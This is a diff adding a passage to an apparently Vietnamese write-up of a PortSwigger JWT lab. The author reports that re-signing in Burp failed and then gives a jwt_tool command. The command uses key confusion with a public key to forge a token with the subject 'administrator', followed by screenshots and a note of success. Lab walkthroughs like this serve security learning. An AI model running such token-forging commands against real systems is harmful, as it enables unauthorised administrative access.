@@ -62,9 +62,21 @@ Tiến hành encode nó bằng base64 để sửa đổi thuật toán kí tiế
 
 ![image](https://github.com/user-attachments/assets/8932d9a4-36cf-4b92-977e-2c7b98c08401)
 
+Vẫn không được, tôi ký nó không chịu đổi :"((, ai biết giải thích tôi với, hay là do burp tôi crack nên version cũ :<
 
+thôi thì dùng jwt tool vậy.
 
+```
+python .\jwt_tool.py eyJraWQiOiJhYmJhZjM1ZC01OTdhLTRhY2YtYTc1Zi0zMTE4YjEzNGJkYjkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTczNTE0MDg0OCwgInN1YiI6ICJ3aWVuZXIifQ.EdTXEWyu1qogUDmwmq52Iwes4HkfGpv1yhH-q1qO34g -X k -pk .\test.pem -I -pc sub -pv administrator
+```
 
+![image](https://github.com/user-attachments/assets/0a6fd3a7-32e9-4609-87dd-09cd2edfbb15)
+
+![image](https://github.com/user-attachments/assets/e6f48952-41ab-4933-8f76-9e68cd17c025)
+
+![image](https://github.com/user-attachments/assets/99ac2976-a09e-41e1-904d-9320f51aa870)
+
+Thành công nhé v:
 
 
 
